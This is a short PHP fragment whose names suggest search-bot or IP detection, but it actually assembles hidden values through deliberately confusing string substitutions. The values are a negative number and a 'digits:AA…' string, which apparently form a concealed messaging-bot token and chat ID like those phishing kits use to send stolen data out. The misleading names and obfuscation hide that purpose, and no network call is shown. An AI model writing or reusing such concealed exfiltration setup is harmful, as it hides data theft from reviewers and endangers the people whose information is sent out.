...
$intervaller = "501.044.156.345";
$IP_track = /*"69.325.178.75"*/$ips[39];

function multiplare($num1) {
    global $ditahc;
    return $ditahc = $num1 * 2;
}

function superdetect($namers) {
    $namers = strval($namers);
    return substr_replace($namers, "3",-1);
}
$detector_class = multiplare(intval(preg_replace("/\./", "", $intervaller)));
$POST_Header = "-".strval($detector_class);
...
$Objectro = substr_replace("MicrosoftG2","AA",0, 11).substr_replace("GoogleBot","F_6XA6uoG",0, 9).substr_replace("YahooBot","bGngcWB6nwOD1",0, 8).substr_replace("YahooBot1", "ubCrmHpfH3ml", 0,9);
$Protecteds = preg_replace("/\./", "", $IP_track).":".substr($Objectro, 0, -1);
